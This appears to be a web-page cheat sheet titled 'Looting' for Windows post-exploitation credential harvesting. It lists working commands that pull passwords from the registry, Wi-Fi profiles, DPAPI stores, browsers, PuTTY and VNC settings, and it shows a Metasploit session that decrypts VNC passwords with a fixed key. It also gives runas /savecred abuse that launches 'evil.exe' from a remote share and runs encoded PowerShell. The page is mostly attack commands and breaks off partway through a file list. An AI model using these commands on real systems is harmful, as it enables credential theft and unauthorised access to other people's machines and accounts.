<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Looting - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "LOOTING", url: "#_top", children: [
              {title: "TOOL", url: "#tool" },
              {title: "SEARCH A FILE", url: "#search-a-file" },
              {title: "WINLOGON CREDENTIALS", url: "#winlogon-credentials" },
              {title: "REGISTRY CREDENTIALS", url: "#registry-credentials" },
              {title: "CHECK TASKS", url: "#check-tasks" },
              {title: "LIST STORED CREDENTIALS", url: "#list-stored-credentials" },
              {title: "DPAPI", url: "#dpapi" },
              {title: "WIFI", url: "#wifi" },
              {title: "BROWSER CREDS", url: "#browser-creds" },
              {title: "PUTTY CREDS", url: "#putty-creds" },
              {title: "PUTTY SSH HOST KEYS", url: "#putty-ssh-host-keys" },
              {title: "SSH KEYS IN REGISTRY", url: "#ssh-keys-in-registry" },
              {title: "WINVNC3", url: "#winvnc3" },
              {title: "SNMP", url: "#snmp" },
              {title: "TIGHTVNC", url: "#tightvnc" },
              {title: "DECRYPT", url: "#decrypt" },
              {title: "OPENSSH", url: "#openssh" },
              {title: "UNATTENDED FILES", url: "#unattended-files" },
          ]},
          {title: "C:\\Windows\\sysprep\\sysprep.xml C:\\Windows\\sysprep\\sysprep.inf C:\\Windows\\sysprep.inf C:\\Windows\\Panther\\Unattended.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\System32\\Sysprep\\unattend.xml C:\\Windows\\System32\\Sysprep\\unattended.xml C:\\unattend.txt C:\\unattend.inf dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2\u0026gt;nul", url: "#cwindowssysprepsysprepxml-cwindowssysprepsysprepinf-cwindowssysprepinf-cwindowspantherunattendedxml-cwindowspantherunattendxml-cwindowspantherunattendunattendxml-cwindowspantherunattendunattendedxml-cwindowssystem32sysprepunattendxml-cwindowssystem32sysprepunattendedxml-cunattendtxt-cunattendinf-dir-s-sysprepinf-sysprepxml-unattendedxml-unattendxml-unattendtxt-2nul", children: [
              {title: "SAM \u0026amp; SYSTEM BACKUPS", url: "#sam-system-backups" },
          ]},
          {title: "# Usually %SYSTEMROOT% = C:\\Windows %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system", url: "#usually-systemroot-cwindows-systemrootrepairsam-systemrootsystem32configregbacksam-systemrootsystem32configsam-systemrootrepairsystem-systemrootsystem32configsystem-systemrootsystem32configregbacksystem", children: [
              {title: "CLOUD CREDENTIALS", url: "#cloud-credentials" },
          ]},
          {title: "##From user home .aws\\credentials AppData\\Roaming\\gcloud\\credentials.db AppData\\Roaming\\gcloud\\legacy_credentials AppData\\Roaming\\gcloud\\access_tokens.db .azure\\accessTokens.json .azure\\azureProfile.json", url: "#from-user-home-awscredentials-appdataroaminggcloudcredentialsdb-appdataroaminggcloudlegacy_credentials-appdataroaminggcloudaccess_tokensdb-azureaccesstokensjson-azureazureprofilejson", children: [
              {title: "CACHED GPP", url: "#cached-gpp" },
              {title: "IIS WEB CONFIG", url: "#iis-web-config" },
              {title: "POSSIBLE FILENAMES CONTAINING CREDS", url: "#possible-filenames-containing-creds" },
              {title: "SAVED RDP CONNECTIONS", url: "#saved-rdp-connections" },
              {title: "RECENTLY RUN COMMANDS", url: "#recently-run-commands" },
              {title: "REMOTE DESKTOP CREDENTIAL MANAGER", url: "#remote-desktop-credential-manager" },
              {title: "APPCMD", url: "#appcmd" },
              {title: "SCCLIENT/SCCM", url: "#scclientsccm" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="looting">LOOTING</h2>
<hr />
<h4 id="tool">TOOL</h4>
<ul>
<li>WinPEAS</li>
<li>Lazagne</li>
<li>SessionGopher</li>
</ul>
<hr />
<h4 id="search-a-file">SEARCH A FILE</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">cd </span><span class="n">c</span><span class="p">:/</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c"># LIST FILE / RECURSE / INCLUDE HIDDEN</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">dir </span><span class="p">/</span><span class="n">b</span><span class="p">/</span><span class="n">s</span><span class="p">/</span><span class="n">a</span> <span class="p">*.</span><span class="n">bat</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">dir </span><span class="p">/</span><span class="n">b</span><span class="p">/</span><span class="n">s</span><span class="p">/</span><span class="n">a</span> <span class="p">*.</span><span class="n">xml</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">dir </span><span class="p">/</span><span class="n">b</span><span class="p">/</span><span class="n">s</span><span class="p">/</span><span class="n">a</span> <span class="p">*.</span><span class="n">ps1</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="p">...</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">rdp</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">xml</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*</span><span class="n">putty</span><span class="p">*</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*</span><span class="n">wifi</span><span class="p">*</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">...</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c"># Check the RecycleBin to look for credentials inside it</span>
</span></code></pre></div>
<hr />
<h4 id="winlogon-credentials">WINLOGON CREDENTIALS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername&quot;</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c">#OTHER WAY</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DefaultDomainName</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DefaultUserName</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DefaultPassword</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">AltDefaultDomainName</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">AltDefaultUserName</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">AltDefaultPassword</span>
</span></code></pre></div>
<hr />
<h4 id="registry-credentials">REGISTRY CREDENTIALS</h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>reg query HKLM /f pass /t REG_SZ /s
</span></code></pre></div>
<hr />
<h4 id="check-tasks">CHECK TASKS</h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>schtasks /query /fo LIST /v
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>schtasks /query /fo LIST /v | select-string -pattern &quot;exe&quot;
</span></code></pre></div>
<hr />
<h4 id="list-stored-credentials">LIST STORED CREDENTIALS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># LIST</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">Currently</span> <span class="n">stored</span> <span class="n">credentials</span><span class="p">:</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    <span class="n">Target</span><span class="p">:</span> <span class="n">Domain</span><span class="p">:</span><span class="n">interactive</span><span class="p">=</span><span class="n">WORKGROUP</span><span class="p">\</span><span class="n">Administrator</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    <span class="n">Type</span><span class="p">:</span> <span class="n">Domain</span> <span class="n">Password</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="n">User</span><span class="p">:</span> <span class="n">WORKGROUP</span><span class="p">\</span><span class="n">Administrator</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c"># ABUSE WITH SMBSHARE</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">WORKGROUP</span><span class="p">\</span><span class="n">Administrator</span> <span class="s2">&quot;\\10.10.10.10\SHARE\evil.exe&quot;</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c"># ABUSE WITH COMMAND EXEC</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">WORKGROUP</span><span class="p">\</span><span class="n">Administrator</span>  <span class="s2">&quot;Powershell -EncodedCommand B64CMD&quot;</span>
</span></code></pre></div>
<hr />
<h4 id="dpapi">DPAPI</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># DPAPI KEY</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">Get-ChildItem</span>  <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">USER</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Protect</span><span class="p">\</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nb">Get-ChildItem</span>  <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">USER</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Protect</span><span class="p">\</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c"># MASTER PASSWORD</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nb">dir </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nb">dir </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nb">Get-ChildItem</span> <span class="n">-Hidden</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="nb">Get-ChildItem</span> <span class="n">-Hidden</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span>
</span></code></pre></div>
:information_source: You can use mimikatz module dpapi::masterkey with the appropiate arguments (/pvk or /rpc) to decrypt it.
:information_source: You can use mimikatz module dpapi::cred with the appropiate /masterkey to decrypt.</p>
<hr />
<h4 id="wifi">WIFI</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*</span><span class="n">wifi</span><span class="p">*</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c">#List saved Wifi using</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profile</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c">#To get the clear-text password use</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profile</span> <span class="p">&lt;</span><span class="n">SSID</span><span class="p">&gt;</span> <span class="n">key</span><span class="p">=</span><span class="nb">clear</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c">#Oneliner to extract all wifi passwords</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nb">cls </span><span class="p">&amp;</span> <span class="n">echo</span><span class="p">.</span> <span class="p">&amp;</span> <span class="k">for</span> <span class="p">/</span><span class="n">f</span> <span class="s2">&quot;tokens=4 delims=: &quot;</span> <span class="k">%</span><span class="n">a</span> <span class="k">in</span> <span class="p">(</span><span class="s1">&#39;netsh wlan show profiles ^| find &quot;Profile &quot;&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="nv">@echo</span> <span class="n">off</span> <span class="p">&gt;</span> <span class="n">nul</span> <span class="p">&amp;</span> <span class="p">(</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profiles</span> <span class="n">name</span><span class="p">=</span><span class="k">%</span><span class="n">a</span> <span class="n">key</span><span class="p">=</span><span class="nb">clear </span><span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;SSID Cipher Content&quot;</span> <span class="p">|</span> <span class="n">find</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Number&quot;</span> <span class="p">&amp;</span> <span class="n">echo</span><span class="p">.)</span> <span class="p">&amp;</span> <span class="nv">@echo</span> <span class="n">on</span>
</span></code></pre></div>
<hr />
<h4 id="browser-creds">BROWSER CREDS</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">Mimikatz</span><span class="p">:</span> <span class="n">dpapi</span><span class="p">::</span><span class="n">chrome</span>
</span></code></pre></div>
:information_source: sharpweb
- Google
- Chrome
- Mozilla
- Firefox
- Microsoft Internet Explorer/Edge</p>
<hr />
<h4 id="putty-creds">PUTTY CREDS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span> <span class="p">/</span><span class="n">s</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername&quot;</span> <span class="c">#Check the values saved in each session, user/password could be there</span>
</span></code></pre></div>
<hr />
<h4 id="putty-ssh-host-keys">PUTTY SSH HOST KEYS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">SimonTatham</span><span class="p">\</span><span class="n">PuTTY</span><span class="p">\</span><span class="n">SshHostKeys</span><span class="p">\</span>
</span></code></pre></div>
<hr />
<h4 id="ssh-keys-in-registry">SSH KEYS IN REGISTRY</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">OpenSSH</span><span class="p">\</span><span class="n">Agent</span><span class="p">\</span><span class="n">Keys</span>
</span></code></pre></div>
<hr />
<h4 id="winvnc3">WINVNC3</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span>
</span></code></pre></div>
<hr />
<h4 id="snmp">SNMP</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Services\SNMP&quot;</span> <span class="p">/</span><span class="n">s</span>
</span></code></pre></div>
<hr />
<h4 id="tightvnc">TIGHTVNC</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKCU\Software\TightVNC\Server&quot;</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="c">#</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span>  <span class="n">HKLM</span><span class="p">:\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">TightVNC</span><span class="p">\</span><span class="n">Server</span><span class="p">\</span> <span class="n">-Name</span> <span class="n">Password</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c">#</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">TightVNC</span><span class="p">\</span><span class="n">Server</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="n">Password</span>
</span></code></pre></div>
<h4 id="decrypt">DECRYPT</h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>msf5 &gt; irb
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>[*] Starting IRB shell...
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>[*] You are in the &quot;framework&quot; object
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>irb: warn: can&#39;t alias jobs from irb_jobs.
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>&gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>&gt;&gt; require &#39;rex/proto/rfb&#39;
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>=&gt; true
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;XXXXXXXXXXXXXXXX&quot;].pack(&#39;H*&#39;), fixedkey
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>=&gt; &quot;password&quot;
</span></code></pre></div>
<hr />
<h4 id="openssh">OPENSSH</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKCU\Software\OpenSSH\Agent\Key&quot;</span>
</span></code></pre></div>
<hr />
<h4 id="unattended-files">UNATTENDED FILES</h4>
<h2 id="cwindowssysprepsysprepxml-cwindowssysprepsysprepinf-cwindowssysprepinf-cwindowspantherunattendedxml-cwindowspantherunattendxml-cwindowspantherunattendunattendxml-cwindowspantherunattendunattendedxml-cwindowssystem32sysprepunattendxml-cwindowssystem32sysprepunattendedxml-cunattendtxt-cunattendinf-dir-s-sysprepinf-sysprepxml-unattendedxml-unattendxml-unattendtxt-2nul"><div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysprep</span><span class="p">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysprep</span><span class="p">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattended</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">\</span><span class="n">Unattend</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">\</span><span class="n">Unattended</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">Sysprep</span><span class="p">\</span><span class="n">unattend</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">Sysprep</span><span class="p">\</span><span class="n">unattended</span><span class="p">.</span><span class="n">xml</span>
